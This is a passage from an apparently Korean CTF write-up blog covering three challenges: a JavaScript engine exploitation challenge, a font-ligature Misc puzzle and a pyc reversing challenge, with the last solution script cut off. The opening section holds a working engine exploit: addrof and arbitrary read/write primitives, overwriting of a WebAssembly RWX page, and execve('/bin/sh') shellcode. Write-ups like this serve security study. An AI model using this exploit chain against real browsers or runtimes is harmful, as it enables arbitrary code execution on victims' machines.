<span class="nx">print</span><span class="p">(</span><span class="dl">"</span><span class="s2">HEAP BASE : </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">base</span><span class="p">))</span>

<span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
   <span class="nx">oo</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span>
   <span class="k">return</span> <span class="nx">base</span> <span class="o">+</span> <span class="p">(</span><span class="nx">oob</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="nx">n</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">aar</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
   <span class="nx">oob</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="nx">addr</span>
   <span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">arb</span><span class="p">);</span>

   <span class="k">return</span> <span class="nx">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">aaw</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
   <span class="nx">oob</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="nx">addr</span>

   <span class="k">if</span><span class="p">(</span><span class="k">typeof</span> <span class="nx">value</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">number</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">arb</span><span class="p">);</span>
      <span class="nx">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span>
   <span class="p">}</span>

   <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="k">typeof</span> <span class="nx">value</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">string</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">arb</span><span class="p">);</span>
      <span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">value</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
         <span class="nx">buf</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">charCodeAt</span><span class="p">();</span>
      <span class="p">}</span>
   <span class="p">}</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">wasmCode</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">11</span><span class="p">]);</span>
<span class="kd">let</span> <span class="nx">wasmModule</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasmCode</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">wasmInstance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasmModule</span><span class="p">);</span>
     
<span class="kd">let</span> <span class="nx">wasmFunction</span> <span class="o">=</span> <span class="nx">wasmInstance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>

<span class="kd">const</span> <span class="nx">Instance</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">wasmInstance</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">rwx</span> <span class="o">=</span> <span class="nx">aar</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">wasmInstance</span><span class="p">)</span><span class="o">+</span><span class="mh">0x5F</span><span class="nx">n</span><span class="p">)</span>
<span class="nx">print</span><span class="p">(</span><span class="dl">"</span><span class="s2">RWX : </span><span class="dl">"</span><span class="o">+</span><span class="nx">hex</span><span class="p">(</span><span class="nx">rwx</span><span class="p">))</span>

<span class="kd">let</span> <span class="nx">shellcode</span> <span class="o">=</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x48</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">xf6</span><span class="se">\</span><span class="s2">x56</span><span class="se">\</span><span class="s2">x48</span><span class="se">\</span><span class="s2">xbf</span><span class="se">\</span><span class="s2">x2f</span><span class="se">\</span><span class="s2">x62</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x6e</span><span class="se">\</span><span class="s2">x2f</span><span class="se">\</span><span class="s2">x2f</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x57</span><span class="se">\</span><span class="s2">x54</span><span class="se">\</span><span class="s2">x5f</span><span class="se">\</span><span class="s2">x48</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">xc0</span><span class="se">\</span><span class="s2">xb0</span><span class="se">\</span><span class="s2">x3b</span><span class="se">\</span><span class="s2">x99</span><span class="se">\</span><span class="s2">x4d</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">xd2</span><span class="se">\</span><span class="s2">x0f</span><span class="se">\</span><span class="s2">x05</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">aaw</span><span class="p">(</span><span class="nx">rwx</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">)</span>

<span class="nx">wasmFunction</span><span class="p">()</span>

<span class="c1">// while(1); // for debug</span>

<span class="c1">// ##END_OF_FILE##</span>
</pre></table></code></div></div><h2 id="l-input-box---misc">L. input box - Misc<a href="#l-input-box---misc" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Font의 GSUB을 이용하여 올바른 플래그가 입력되었다면 GOOD 이미지를 출력하는 문제이다.</p><p>대충 입력해보면 아스키 범위의 모든 문자들에 어떠한 이미지도 매핑이 되어있지 않은 것을 확인할 수 있다,</p><p>otf파일을 ttx로 파싱해서 보면 <code class="language-plaintext highlighter-rouge">G00979</code>의 width만 다른 것을 알 수 있다.<br /> 따라서 해당 <code class="language-plaintext highlighter-rouge">Glyph</code>가 플래그의 끝을 의미한다.<br /> 해당 <code class="language-plaintext highlighter-rouge">Glyph</code>를 포함하는 <code class="language-plaintext highlighter-rouge">Ligature</code>를 갖고 있는 <code class="language-plaintext highlighter-rouge">LigatureSet</code>을 찾으면<br /> <code class="language-plaintext highlighter-rouge">Glyph G00923</code>를 속성으로 갖는 <code class="language-plaintext highlighter-rouge">LigatureSet</code>이 <code class="language-plaintext highlighter-rouge">G00979</code>를 <code class="language-plaintext highlighter-rouge">Component=braceright</code>인 <code class="language-plaintext highlighter-rouge">Ligature</code>로 갖고 있다.<br /> 따라서 플래그의 마지막 글자는 <code class="language-plaintext highlighter-rouge">}</code></p><p><code class="language-plaintext highlighter-rouge">Glyph G00923</code>를 포함하는 <code class="language-plaintext highlighter-rouge">Ligature</code>를 갖고 있는 <code class="language-plaintext highlighter-rouge">LigatureSet</code>을 찾으면<br /> <code class="language-plaintext highlighter-rouge">Glyph G00877</code>를 속성으로 갖는 <code class="language-plaintext highlighter-rouge">LigatureSet</code>이 <code class="language-plaintext highlighter-rouge">G00923</code>를 <code class="language-plaintext highlighter-rouge">Component=numbersign</code>인 <code class="language-plaintext highlighter-rouge">Ligature</code>로 갖고 있다.<br /> 따라서 플래그의 마지막에서 두번째 글자는 <code class="language-plaintext highlighter-rouge">#</code></p><p>이러한 반복하면 플래그를 얻을수 있었다.</p><p>파싱 코드를 짤 시간에 손으로 구하고 만다는 마인드로 <code class="language-plaintext highlighter-rouge">Ctrl+F</code>를 이용해서 풀었기 때문에 코드가 없다.</p><p>문제의 결은 많이 다르지만 플래그를 읽고 <a href="https://ctftime.org/task/16443">redpwn 2021에 출제된 misc 문제</a>가 생각이 났다.</p><h2 id="m-pyc---reversing">M. pyc - Reversing<a href="#m-pyc---reversing" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>pyc 데이터를 갖고있는 파일을 분석하는 컨셉의 문제이다.</p><p>우선 주어진 파일을 디스어셈한 후에 디스어셈된 파일을 보면<br /> <code class="language-plaintext highlighter-rouge">chk</code>와 <code class="language-plaintext highlighter-rouge">throw</code>라는 함수가 존재하는 것을 확인할 수 있다.</p><p>그 중, <code class="language-plaintext highlighter-rouge">throw</code>라는 함수가 <code class="language-plaintext highlighter-rouge">chk.__code__</code> 에다가 m이라는 리스트에 담긴 값으로 xor을 하고 인풋을 인자로 chk을 호출하는 것을 확인할 수 있다.</p><p>때문에 아래와 같이 pyc 데이터에 xor하는 스크립트를 작성하였다.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">a</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"74006401 83017D01 74016401 64026702 83017D01 7402A003 7C026403 A102A004 64026403 A1027D02 64047D03 64057D04 64067D05 64077D06 64087D07 74007402 74056409 83018301 83017D08 74068300 7D087407 74067C00 83017408 83024400 5D0B5C02 7D017D09 7C08A009 7C017C09 4100A101 01007130 740A7C08 83015300 290A4E72 57000000 72620000 00DA06"</span><span class="p">)</span> <span class="c1"># chk.__code__
</span><span class="n">m</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">254</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">124</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">222</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">196</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">225</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">197</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">248</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">125</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">149</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">253</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">196</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">196</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">208</span><span class="p">,</span> <span class="mi">1</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">i</span><span class="o">^</span><span class="n">j</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">j</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">m</span><span class="o">+</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">200</span><span class="p">)).</span><span class="nb">hex</span><span class="p">())</span>
</pre></table></code></div></div><p>위 스크립트를 실행하여 나온 아웃풋을 다시 손수 hex editor로 넣어주면 chk의 디스어셈된 코드가 바뀐다.<br /> 해당 함수를 hand-ray로 디컴파일하면 아래와 같다</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">chk</span><span class="p">(</span><span class="n">ipt</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ipt</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">):</span>
        <span class="n">r0</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">ipt</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="s">'little'</span><span class="p">)</span>
        <span class="n">ipt</span> <span class="o">=</span> <span class="n">ipt</span><span class="p">[:</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="p">((((</span><span class="n">r0</span> <span class="o">&gt;&gt;</span> <span class="p">((</span><span class="n">i</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span><span class="o">%</span><span class="mi">32</span><span class="p">))</span> <span class="o">|</span> <span class="p">(</span><span class="n">r0</span> <span class="o">&lt;&lt;</span> <span class="p">((</span><span class="o">-</span><span class="n">i</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span><span class="o">%</span><span class="mi">32</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span><span class="o">^</span><span class="mh">0xDEADBEEF</span><span class="p">).</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span><span class="o">+</span><span class="n">ipt</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">:]</span>
    <span class="k">return</span> <span class="n">ipt</span>
</pre></table></code></div></div><p>복잡하지 않은 연산이므로 역연산 코드를 작성하여 플래그를 휙득하였다.</p><blockquote><p>Solution Script</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="n">k</span> <span class="o">=</span> <span class="p">[</span><span class="mi">161</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">143</span><span class="p">,</span> <span class="mi">139</span><span class="p">,</span> <span class="mi">247</span><span class="p">,</span> <span class="mi">182</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">140</span><span class="p">,</span> <span class="mi">132</span><span class="p">,</span> <span class="mi">222</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">232</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">152</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">202</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">143</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">194</span><span class="p">,</span> <span class="mi">161</span><span class="p">,</span> <span class="mi">241</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">237</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">254</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">85</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">220</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">179</span><span class="p">,</span> <span class="mi">201</span><span class="p">,</span> <span class="mi">216</span><span class="p">,</span> <span class="mi">132</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">53</span><span class="p">]</span>
<span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="mi">239</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">198</span><span class="p">,</span> <span class="mi">239</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">208</span><span class="p">,</span> <span class="mi">223</span><span class="p">,</span> <span class="mi">159</span><span class="p">,</span> <span class="mi">135</span><span class="p">,</span> <span class="mi">245</span><span class="p">,</span> <span class="mi">211</span><span class="p">,</span> <span class="mi">181</span><span class="p">,</span> <span class="mi">173</span><span class="p">,</span> <span class="mi">210</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">254</span><span class="p">,</span> <span class="mi">132</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">250</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">208</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="mi">241</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">149</span><span class="p">,</span> <span class="mi">185</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">161</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">173</span><span class="p">,</span> <span class="mi">220</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">189</span><span class="p">,</span> <span class="mi">165</span><span class="p">,</span> <span class="mi">205</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">72</span><span class="p">]</span>
<span class="n">m</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">254</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">124</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">222</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">196</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">225</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">197</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">248</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">125</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">149</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span 